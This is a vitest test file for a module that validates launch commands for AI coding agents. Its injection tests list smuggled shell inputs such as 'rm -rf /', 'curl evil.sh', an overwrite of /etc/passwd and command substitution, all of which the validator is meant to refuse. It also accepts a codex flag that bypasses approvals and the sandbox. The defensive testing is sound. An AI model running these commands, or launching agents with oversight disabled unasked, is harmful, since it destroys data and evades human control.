import { describe, expect, it } from "vitest";
import {
  commandAgentId,
  commandFlags,
  commandProblem,
  createLaunchProfileId,
  findLaunchProfile,
  isLaunchCommand,
  profilesForAgent,
  validateDefaultLaunchProfiles,
  validateLaunchProfiles,
  type LaunchProfile,
} from "./launch-profile";

const plan: LaunchProfile = {
  id: "lp:plan",
  command: "claude --permission-mode plan",
};

const bypass: LaunchProfile = {
  id: "lp:bypass",
  command: "codex --dangerously-bypass-approvals-and-sandbox",
};

describe("commandProblem", () => {
  it("accepts the commands the reference image shows", () => {
    expect(commandProblem("claude")).toBeNull();
    expect(commandProblem("claude --plan")).toBeNull();
    expect(commandProblem("codex --dangerously-bypass-approvals-and-sandbox")).toBeNull();
    expect(commandProblem("cursor-agent --force")).toBeNull();
    expect(commandProblem("opencode --model anthropic/claude-sonnet-5")).toBeNull();
  });

  // This string is written VERBATIM into a live interactive shell, so every
  // character a shell acts on has to be refused at the door.
  it("refuses anything a shell would act on", () => {
    expect(commandProblem("claude; rm -rf /")).not.toBeNull();
    expect(commandProblem("claude && curl evil.sh")).not.toBeNull();
    expect(commandProblem("claude | tee out")).not.toBeNull();
    expect(commandProblem("claude $(whoami)")).not.toBeNull();
    expect(commandProblem("claude `whoami`")).not.toBeNull();
    expect(commandProblem("claude > /etc/passwd")).not.toBeNull();
    expect(commandProblem('claude --x "y"')).not.toBeNull();
    expect(commandProblem("claude\nrm -rf /")).not.toBeNull();
  });

  it("refuses an empty or over-long command", () => {
    expect(commandProblem("")).not.toBeNull();
    expect(commandProblem("   ")).not.toBeNull();
    expect(commandProblem("claude " + "x".repeat(300))).not.toBeNull();
  });
});

describe("isLaunchCommand", () => {
  it("answers for stored values of any type", () => {
    expect(isLaunchCommand("claude --plan")).toBe(true);
    expect(isLaunchCommand("claude; ls")).toBe(false);
    expect(isLaunchCommand(7)).toBe(false);
    expect(isLaunchCommand(null)).toBe(false);
  });
});

describe("commandAgentId / commandFlags", () => {
  it("splits a command into its binary and its flags", () => {
    expect(commandAgentId("claude --permission-mode plan")).toBe("claude");
    expect(commandFlags("claude --permission-mode plan")).toBe("--permission-mode plan");
    expect(commandAgentId("claude")).toBe("claude");
    expect(commandFlags("claude")).toBe("");
  });
});

describe("createLaunchProfileId", () => {
  it("mints a prefixed slug and never collides", () => {
    expect(createLaunchProfileId("claude --plan", [])).toBe("lp:claude-plan");
    expect(
      createLaunchProfileId("claude --plan", [{ id: "lp:claude-plan", command: "claude --plan" }]),
    ).toBe("lp:claude-plan-2");
  });
});

describe("profilesForAgent", () => {
  it("selects by the command's own binary", () => {
    const all = [plan, bypass];
    expect(profilesForAgent("claude", all)).toEqual([plan]);
    expect(profilesForAgent("gemini", all)).toEqual([]);
  });
});

describe("findLaunchProfile", () => {
  it("answers null for a null id and for an unknown id", () => {
    expect(findLaunchProfile(null, [plan])).toBeNull();
    expect(findLaunchProfile("lp:gone", [plan])).toBeNull();
    expect(findLaunchProfile("lp:plan", [plan])).toEqual(plan);
  });
});

describe("validateLaunchProfiles", () => {
  it("keeps a well-formed profile", () => {
    expect(validateLaunchProfiles([plan])).toEqual([plan]);
  });

  it("drops a profile rather than repairing it", () => {
    expect(validateLaunchProfiles("nope")).toEqual([]);
    expect(validateLaunchProfiles([{ id: "lp:x" }])).toEqual([]);
    expect(validateLaunchProfiles([{ id: "lp:x", command: "claude; rm -rf /" }])).toEqual([]);
    expect(validateLaunchProfiles([{ id: 7, command: "claude" }])).toEqual([]);
  });

  it("drops a duplicate id, first wins", () => {
    const second: LaunchProfile = { ...plan, command: "claude --other" };
    expect(validateLaunchProfiles([plan, second])).toEqual([plan]);
  });
});

describe("validateDefaultLaunchProfiles", () => {
  it("keeps a mapping that points at a command for that agent", () => {
    expect(validateDefaultLaunchProfiles({ claude: "lp:plan" }, [plan])).toEqual({
      claude: "lp:plan",
    });
  });

  it("drops a dangling id and a cross-agent mapping", () => {
    expect(validateDefaultLaunchProfiles({ claude: "lp:gone" }, [plan])).toEqual({});
    expect(validateDefaultLaunchProfiles({ codex: "lp:plan" }, [plan])).toEqual({});
    expect(validateDefaultLaunchProfiles(null, [plan])).toEqual({});
  });
});
